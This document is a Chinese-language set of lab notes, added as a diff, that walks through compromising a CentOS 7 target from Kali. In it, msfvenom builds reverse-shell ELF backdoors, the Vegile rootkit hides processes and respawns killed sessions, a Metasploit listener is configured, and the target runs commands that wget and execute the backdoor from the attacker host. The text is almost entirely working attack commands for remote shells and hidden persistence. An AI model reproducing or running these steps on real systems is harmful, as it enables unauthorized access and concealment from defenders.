@@ -1,0 +1,71 @@
+攻击机（kali）：10.211.55.6
+靶机（centos7）：10.211.55.7
+
+攻击机（kali）：10.211.55.6
+恶意文件，让靶机执行
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=10.211.55.6 LPORT=8080 -b "\x00" -f elf -o /var/www/html/laohe_backdoor
+用来拿权限
+给靶机下载这个
+
+生成一个用来隐藏的后门
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -f elf -o /var/www/html/laohe_ghost
+
+
+
+上传vegile维吉尔工具到网站目录下，方便centos下载
+权限维持，设置后门，rootkit，会隐藏进程；无线连接，
+下载地址：https://github.com/screetsec/Vegile
+
+./Vegile --i
+隐藏后门
+
+./Vegile --u
+无限复制你的metaspoit会话，即使被kill，也能再次运行
+
+生成的木马，一定要放在Vegile目录下；用与维持会话
+
+┌──(root💀kali-linux-2021-3)-[~]
+└─# mv ~/Vegile-master /var/www/html 
+                                                                                                                                             
+┌──(root💀kali-linux-2021-3)-[~]
+└─# ls /var/www/html
+
+靶机（centos7）：10.211.55.7
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfconsole
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > exploit -j
+后台监听
+msf6 exploit(multi/handler) > sessions
+当前还未建立连接
+msf6 exploit(multi/handler) > jobs
+sessions看不到，jobs能看到
+
+###进入靶机
+wget http://10.211.55.6/laohe_backdoor
+chmod +x laohe_backdoor
+./ laohe_backdoor
+
+###进入攻击机
+后台监听，需要查看
+msf6 exploit(multi/handler) > sessions
+msf6 exploit(multi/handler) > sessions -i 1
+启动
+msf6 exploit(multi/handler) > sessions会话
+
+
+
+
+
+
+
+
+
+
